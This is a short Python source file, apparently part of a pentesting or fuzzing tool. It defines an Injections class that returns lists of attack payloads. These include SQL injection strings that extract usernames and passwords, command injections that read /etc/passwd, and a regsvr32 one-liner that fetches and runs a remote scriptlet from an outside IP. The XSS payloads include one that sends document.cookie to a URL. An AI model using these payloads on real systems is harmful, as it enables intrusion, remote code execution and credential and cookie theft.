class Injections():
    def injection_options():
        injection_type = input('\n[!] What type of injection do you want?\
        (Options: SQL, Command, XSS, RCE, LDAP, LFI, Fuzzer)\
        \n-> ')

        return injection_type

    def sql_injections():
        sql_injections = ['0x200', "' OR 'a'='a", '*/*', "') or \
        (SELECT admin FROM users WHERE admin = true AND ''='",
        "'UNION ALL SELECT username, password FROM members WHERE admin=1--'"]

        return sql_injections

    def command_injections():
        command_injections = ['../../etc/passwd', '; cat /etc/passwd',
            '<!--#exec cmd="ls ../"-->',"|| regsvr32 /s /n /u /\
            i:http://192.168.1.103:8080/C99PdFH.sct scrobj.dll"]

        return command_injections

    def xss_injections():
        xss_injections = ["<script>alert('hacked')</script>",
        "<iframe src='http://cnn.com'></iframe>",
        "<script>window.location.href =\
        'https://www.dropbox.com/s/ewbk6o8lttcd4t4/Get%20Started%20with%20Dropbox.pdf?dl=1'\
        </script>", "<script>/* */var i=new Image();/* */i.src=\
        'http://localhost:3000/search?utf8=%E2%9C%93&query='+document.cookie+'\
        &commit=Go'/**/</script>","<<SCRIPT>alert('HackThis!!');//<</SCRIPT>",
        ""]

        return xss_injections
